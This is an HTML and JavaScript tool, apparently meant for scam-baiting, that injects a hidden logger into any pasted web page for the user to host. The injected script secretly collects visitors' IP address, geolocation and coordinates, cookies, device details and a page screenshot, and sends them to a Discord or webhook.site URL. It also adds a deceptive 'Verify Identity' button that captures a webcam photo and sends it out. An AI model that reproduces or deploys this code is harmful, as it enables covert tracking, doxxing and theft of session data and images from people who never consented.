<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Source Code Injector - Fixed</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 100%);
            font-family: 'Consolas', 'Monaco', monospace;
            padding: 20px;
            min-height: 100vh;
        }
        .container { max-width: 1600px; margin: 0 auto; }
        h1 { color: #0f0; margin-bottom: 10px; }
        .sub { color: #888; margin-bottom: 30px; }
        .row { display: flex; gap: 20px; flex-wrap: wrap; }
        .col { flex: 1; min-width: 300px; }
        .card {
            background: rgba(0,0,0,0.7);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid #333;
        }
        .card h3 { color: #0f0; margin-bottom: 15px; border-left: 3px solid #0f0; padding-left: 12px; }
        label { display: block; margin-bottom: 8px; color: #ccc; font-weight: bold; }
        textarea {
            width: 100%;
            background: #0a0a0f;
            border: 1px solid #333;
            color: #0f0;
            font-family: monospace;
            font-size: 12px;
            padding: 15px;
            border-radius: 8px;
            resize: vertical;
        }
        input {
            width: 100%;
            background: #0a0a0f;
            border: 1px solid #333;
            color: #fff;
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 15px;
            font-family: monospace;
        }
        button {
            background: #0f0;
            color: #000;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            margin-right: 10px;
        }
        button:hover { background: #0c0; }
        button.danger { background: #f00; color: #fff; }
        .preview {
            background: #0a0a0f;
            border-radius: 8px;
            padding: 15px;
            max-height: 400px;
            overflow: auto;
            font-size: 11px;
            white-space: pre-wrap;
            word-wrap: break-word;
            border: 1px solid #333;
        }
        .status {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #333;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 12px;
            z-index: 1000;
        }
        .status.success { background: #0a0; color: #000; }
        .status.error { background: #a00; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔧 Source Code Injector</h1>
        <div class="sub">Paste HTML → Inject logger → Copy → Host anywhere</div>
        
        <div class="row">
            <div class="col">
                <div class="card">
                    <h3>📝 Step 1: Paste Your Source Code</h3>
                    <textarea id="sourceCode" rows="12" placeholder="&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Your Page&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;Hello World&lt;/h1&gt;
&lt;/body&gt;
&lt;/html&gt;"></textarea>
                </div>
                
                <div class="card">
                    <h3>⚙️ Step 2: Configure</h3>
                    <label>📮 Webhook URL (Discord or Webhook.site)</label>
                    <input type="text" id="webhook" placeholder="https://webhook.site/... or https://discord.com/api/webhooks/...">
                    <p style="color:#888; font-size:11px; margin-top:-10px;">⚠️ Discord blocks direct browser requests. Use <strong>https://webhook.site</strong> for testing.</p>
                    
                    <label>🎥 Webcam</label>
                    <select id="webcamMode">
                        <option value="off">Off</option>
                        <option value="prompt">Prompt with Button</option>
                    </select>
                    
                    <label>📸 Screenshot</label>
                    <select id="screenshotMode">
                        <option value="full">Full Page</option>
                        <option value="off">Off</option>
                    </select>
                </div>
            </div>
            
            <div class="col">
                <div class="card">
                    <h3>⚡ Step 3: Inject & Copy</h3>
                    <button id="injectBtn">🔍 Inject Logger</button>
                    <button id="copyBtn" class="danger">📋 Copy Result</button>
                    <hr style="margin: 15px 0; border-color: #333;">
                    <h3>📄 Output</h3>
                    <div id="output" class="preview">Waiting...</div>
                </div>
            </div>
        </div>
    </div>
    
    <div id="status" class="status">Ready</div>
    
    <script>
        function getLoggerScript(webhook, webcamMode, screenshotMode) {
            return `
<!-- Injected Logger -->
<script>
(async function() {
    const WEBHOOK = '${webhook}';
    const WEBCAM_MODE = '${webcamMode}';
    const SCREENSHOT_MODE = '${screenshotMode}';
    
    let data = {
        ip: '', postal: '', city: '', region: '', country: '', lat: '', lon: '',
        ua: navigator.userAgent,
        screen: screen.width + 'x' + screen.height,
        lang: navigator.language,
        cores: navigator.hardwareConcurrency || 'unknown',
        memory: navigator.deviceMemory || 'unknown',
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer,
        url: window.location.href,
        cookies: document.cookie,
        time: new Date().toISOString(),
        screenshot: null
    };
    
    // Get IP + postal code
    try {
        const res = await fetch('https://ip-api.com/json/');
        const geo = await res.json();
        if (geo.status === 'success') {
            data.ip = geo.query;
            data.postal = geo.zip || 'N/A';
            data.city = geo.city;
            data.region = geo.regionName;
            data.country = geo.country;
            data.lat = geo.lat;
            data.lon = geo.lon;
        }
    } catch(e) {}
    
    // Screenshot
    if (SCREENSHOT_MODE !== 'off') {
        await new Promise((resolve) => {
            if (window.html2canvas) return resolve();
            const s = document.createElement('script');
            s.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
            s.onload = resolve;
            document.head.appendChild(s);
        });
        try {
            const canvas = await html2canvas(document.body, { scale: 0.5 });
            data.screenshot = canvas.toDataURL('image/jpeg', 0.7);
        } catch(e) {}
    }
    
    // Webcam button
    if (WEBCAM_MODE === 'prompt') {
        const btn = document.createElement('button');
        btn.innerText = '🔐 Verify Identity';
        btn.style.cssText = 'position:fixed;bottom:20px;right:20px;z-index:99999;background:#0f0;color:#000;padding:10px 20px;border:none;border-radius:5px;cursor:pointer;font-weight:bold;z-index:999999';
        btn.onclick = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                await new Promise(r => video.onloadedmetadata = r);
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const webcamImg = canvas.toDataURL('image/jpeg', 0.6);
                stream.getTracks().forEach(t => t.stop());
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: '📸 WEBCAM', embeds: [{ title: 'Webcam', image: { url: webcamImg } }] })
                });
            } catch(e) {}
            btn.remove();
        };
        document.body.appendChild(btn);
    }
    
    // Send everything
    try {
        await fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: null,
                embeds: [{
                    title: '🎯 Scammer Data',
                    color: 0x00ff00,
                    fields: [
                        { name: 'IP', value: data.ip, inline: true },
                        { name: 'Postal Code', value: data.postal, inline: true },
                        { name: 'Location', value: data.city + ', ' + data.region + ', ' + data.country, inline: true },
                        { name: 'Coords', value: data.lat + ', ' + data.lon, inline: true },
                        { name: 'User Agent', value: data.ua.substring(0, 80), inline: false },
                        { name: 'Screen', value: data.screen, inline: true },
                        { name: 'Cores/RAM', value: data.cores + 'c / ' + data.memory + 'GB', inline: true },
                        { name: 'Timezone', value: data.tz, inline: true },
                        { name: 'Referrer', value: data.referrer || 'Direct', inline: false },
                        { name: 'Page URL', value: data.url, inline: false }
                    ],
                    timestamp: data.time
                }]
            })
        });
        if (data.screenshot) {
            await fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [{ title: '📸 Screenshot', image: { url: data.screenshot } }] })
            });
        }
    } catch(e) {}
})();
<\/script>
`;
        }
        
        const sourceTextarea = document.getElementById('sourceCode');
        const webhookInput = document.getElementById('webhook');
        const webcamSelect = document.getElementById('webcamMode');
        const screenshotSelect = document.getElementById('screenshotMode');
        const injectBtn = document.getElementById('injectBtn');
        const copyBtn = document.getElementById('copyBtn');
        const outputDiv = document.getElementById('output');
        const statusDiv = document.getElementById('status');
        
        let currentOutput = '';
        
        function setStatus(msg, isError = false) {
            statusDiv.textContent = msg;
            statusDiv.className = 'status ' + (isError ? 'error' : 'success');
            setTimeout(() => {
                if (statusDiv.textContent === msg) statusDiv.className = 'status';
            }, 3000);
        }
        
        function injectLogger() {
            let source = sourceTextarea.value;
            if (!source.trim()) {
                setStatus('Paste HTML source code first', true);
                return;
            }
            
            let webhook = webhookInput.value.trim();
            if (!webhook) {
                setStatus('Enter a webhook URL (Webhook.site or Discord)', true);
                return;
            }
            
            const logger = getLoggerScript(webhook, webcamSelect.value, screenshotSelect.value);
            
            let injected = source;
            if (injected.includes('</head>')) {
                injected = injected.replace('</head>', logger + '\n</head>');
            } else if (injected.includes('</body>')) {
                injected = injected.replace('</body>', logger + '\n</body>');
            } else {
                injected = logger + '\n' + injected;
            }
            
            currentOutput = injected;
            outputDiv.textContent = currentOutput.length > 3000 ? currentOutput.substring(0, 3000) + '\n...' : currentOutput;
            setStatus('✅ Injected! Copy the code and host it.');
        }
        
        async function copyOutput() {
            if (!currentOutput) {
                setStatus('Nothing to copy', true);
                return;
            }
            try {
                await navigator.clipboard.writeText(currentOutput);
                setStatus('✅ Copied!');
            } catch(err) {
                setStatus('Copy failed', true);
            }
        }
        
        injectBtn.addEventListener('click', injectLogger);
        copyBtn.addEventListener('click', copyOutput);
        
        const saved = localStorage.getItem('scambait_webhook');
        if (saved) webhookInput.value = saved;
        webhookInput.addEventListener('change', () => localStorage.setItem('scambait_webhook', webhookInput.value));
        
        setStatus('Ready — use Webhook.site for testing');
    </script>
</body>
</html>
